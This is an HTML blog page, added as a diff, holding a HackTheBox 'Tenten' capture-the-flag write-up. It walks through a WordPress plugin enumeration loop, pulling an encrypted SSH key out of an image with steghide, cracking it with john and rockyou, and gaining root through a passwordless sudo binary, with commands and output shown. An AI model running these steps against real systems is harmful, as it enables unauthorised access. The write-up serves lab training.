@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; connect-src 'self'; media-src 'self'; object-src 'self'; child-src 'self'; form-action 'none'; base-uri 'self'" />
+<meta http-equiv="X-XSS-Protection"  content="1;mode=block" always>
+<meta http-equiv="Referrer-Policy" content="no-referrer, strict-origin-when-cross-origin"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>HackTheBox - Tenten</title>
+ 
+
+  <link rel="stylesheet" type="text/css" href="/assets/main-hacker.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul>
+      <li class="menu-first-child">
+        <span>
+          [cyberRat@RedTeam]~$
+          <span class="blink">
+            █
+          </span>
+        </span>
+      </li>
+      <li>
+        <a href="/">Home</a>
+      </li>
+
+    
+      <li>
+        <a href="/brainbox/">/BrainBox</a>
+      </li> 
+      <li>
+        <a href="/resume/">/Resume</a>
+      </li>
+
+    </ul>
+  </div>
+</header>
+
+<main>
+      <h1 id="nmap-scan">Nmap scan</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
+|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
+|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: WordPress 4.7.3
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Job Portal &amp;#8211; Just another WordPress site
+Warning: OSScan results may be unreliable
+</code></pre></div></div>
+
+<h1 id="webapp-recon--pwn">Webapp recon &amp; pwn</h1>
+<p>Nmap scan leaks wordpress as a title. Wpscan returns a vulnerable plugin = ‘job manager’ and two users, ‘takis’ &amp; ‘zesk’.
+Reading about the vulnerable plugin, it seems we can enumerate the site with the plugin.
+We can fuzz this param with a basic bash oneliner.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>or i in $(seq 1 15); do echo -n " $i "; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep '&lt;title&gt;'; done
+ 1 &lt;title&gt;Job Application: Hello world! &amp;#8211; Job Portal&lt;/title&gt;
+ 2 &lt;title&gt;Job Application: Sample Page &amp;#8211; Job Portal&lt;/title&gt;
+ 3 &lt;title&gt;Job Application: Auto Draft &amp;#8211; Job Portal&lt;/title&gt;
+ 4 &lt;title&gt;Job Application &amp;#8211; Job Portal&lt;/title&gt;
+ 5 &lt;title&gt;Job Application: Jobs Listing &amp;#8211; Job Portal&lt;/title&gt;
+ 6 &lt;title&gt;Job Application: Job Application &amp;#8211; Job Portal&lt;/title&gt;
+ 7 &lt;title&gt;Job Application: Register &amp;#8211; Job Portal&lt;/title&gt;
+ 8 &lt;title&gt;Job Application: Pen Tester &amp;#8211; Job Portal&lt;/title&gt;
+ 9 &lt;title&gt;Job Application:  &amp;#8211; Job Portal&lt;/title&gt;
+ 10 &lt;title&gt;Job Application: Application &amp;#8211; Job Portal&lt;/title&gt;
+ 11 &lt;title&gt;Job Application: cube &amp;#8211; Job Portal&lt;/title&gt;
+ 12 &lt;title&gt;Job Application: Application &amp;#8211; Job Portal&lt;/title&gt;
+ 13 &lt;title&gt;Job Application: HackerAccessGranted &amp;#8211; Job Portal&lt;/title&gt;
+ 14 &lt;title&gt;Job Application: Application &amp;#8211; Job Portal&lt;/title&gt;
+ 15 &lt;title&gt;Job Application: temp_logo_testing &amp;#8211; Job Portal&lt;/title&gt;
+</code></pre></div></div>
+<p>‘hackeraccessgranted’ looks interesting, as if someones already pwned the app. Visiting the page shows an image.
+We can get the image with wget and start poking steganography techniques at it. Steghide yields something</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>steghide extract -sf HackerAccessGranted.jpg 
+Enter passphrase: &lt;blank&gt; 
+wrote extracted data to "id_rsa".
+</code></pre></div></div>
+<p>File we retrieve is a private rsa key which has been encrypted. ssh2john can help us out.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh2john id_rsa &gt; id.encrypted
+root@kali:~/htb/tenten# john id.encrypted --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA 32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+superpassword    (id_rsa)
+1g 0:00:00:00 DONE (2018-12-12 22:32) 1.123g/s 876444p/s 876444c/s 876444C/s superpassword
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+<p>Chmod 600 the file and login with takis user we found before.</p>
+
+<h1 id="gaining-root">Gaining root.</h1>
+<p>Again a sudo check reveals all.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>takis@tenten:~$ sudo -l
+Matching Defaults entries for takis on tenten:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User takis may run the following commands on tenten:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: /bin/fuckin
+</code></pre></div></div>
+<p>It seems our current user can run the binary ‘fuckin’ without a password. Looking at the binary, we can see its simply calling bash with root permissions so we can abuse this to read the root file.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>takis@tenten:/bin$ sudo fuckin id
+uid=0(root) gid=0(root) groups=0(root)
+
+takis@tenten:/bin$ sudo fuckin cat /root/root.txt
+&lt;redacted&gt;
+</code></pre></div></div>
+
+<p>done and dusted.</p>
+
+
+    </main><footer>
+  <a href="https://twitter.com/ratilovich">Twitter</a> 
+</footer>
+</div>
+  </body>
+</html>
